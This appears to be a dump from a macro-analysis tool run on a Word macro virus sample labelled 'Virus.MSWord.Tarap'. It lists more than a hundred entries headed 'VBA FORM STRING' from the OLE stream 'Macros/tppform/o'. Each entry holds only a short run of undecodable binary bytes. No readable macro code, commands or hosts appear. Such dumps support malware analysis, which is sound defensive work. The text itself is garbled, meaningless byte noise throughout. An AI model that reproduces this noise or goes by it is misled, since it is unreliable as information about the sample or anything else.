- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Lԧ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A��F
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N��* $��Y]N��U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$ˆ<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��p��Hn-	l� 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 `�![�K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b����`�fTGlm
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m`B�a�z�Y/r�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8'=8�U`3Kge=�� 	�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����A��##;�0:�ˬnR��+i�'��ѐ*��T@̌
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�2$��2�8�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 aA�1�*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X��,k�%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6Q�gc�
X�N[n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g3Am�5ͥ�<NАg�gRK#/�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qך�L�f�"�Ҟ�����]���C���%��`�2N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g֬�I�����cW"+�w<S�!RT�S����s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�����[9dKw��*���B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�Mmnβ,��*6�n
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5Xڽ��b�#�q��Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Fyn���H�B�C0X�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ng���P����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˚<�Ys��u=3�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8��1�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���FRH���䏮�	^rA
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ǯr�{��ki�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x-ܱf9f|�B��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'����-�I����l��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���f�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<H|Cc�x/N��i<�G�b٢�Rţ>Tc
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_��>8Y[�~,G�U�\Ewuw-��w����;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ѿd�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[I�O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Vխ�� �;��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e8V��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&��|A�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x>�[���M�51}��rDw��f$%��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�?=G�_ۅ~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�Ѷ:���]��<VtWm7X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�9�FP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�΁��#��M���^G�h����mKLQ$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ua���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��Ip̓Hc0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�H�U��E>E�����˒���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�~l`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i^1�ا��P����W��l
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2�P{�m��ȥxo
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:}�V��]E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�YT��x
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ey-�!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��x�ݱ��#s�@ rz��ҨY40�wI
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�yv�4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;I犷��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�d�X�E-	�^�">�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=y��2��=*4��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�(���d�H�l�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4v��0�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ��-�Z7\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�ϧ�o<qy�@�$2,���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�3���+�<\A4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�J�#���_*3�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ti��UX�ĒKm8n�3�u8�kk
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���)��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���fd,��+`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GO,�~=[�Z���EՍ�����Q��=�r�a��T�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��sH����k�B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ۄ{��ɹ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[��O,�#�%��$/���1���Bw
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TpG � b���$6�cs
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%��b�V��Q�[��5�G��2�)�<m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$`p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�c'�,�@d��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W8Q�'<�{"�5��^*��~2�֞
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vV�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#W�3",�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�B|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��)��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q]Cx�܋
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2��*;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�if���id� �!�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��¹'n7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�-R�]ľ�UX���ۗ�u*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pA��i�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;UK���}�X�Y��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

]q�x'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z��Ю��ۑ�ۇ7v��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�aP����_��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
é�MS�ǈG����_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9ŉ]McY��W������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�$�G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ՏK���X��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@,GȤ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�(&YvF���@�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pè��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f���#�Ԯ-ʬҋxʲoPT|���MÐq�=*������}���Aͽ͝�y`ȇ�Gے9ǧ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�in��K
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}��n�F-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
둌q+Ɵ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)��HL�q��g��מs5�v-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���y���Q�$�2��b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
;���k��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O���g�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|*���O�T���L
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���0ZG8

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�>�Hl��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K#ͦ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6�\�b�u\�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�jv���Z���Wօ�L�K�!��yle^p3����) 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǉ4o
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]$�W�nb�[����TvM��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$5u�ڥ�v0���V�\��P�p�<��cF�7;`�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|	�m'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%��߆�ש�6W.�ya
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�F���)#`Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�^���>
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ŗ��]:����R�$���%
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,���,F}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�p�-��C3A!@Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�r}@�d�Comb�#C}�3O+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�	�eedʶW�ۂ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
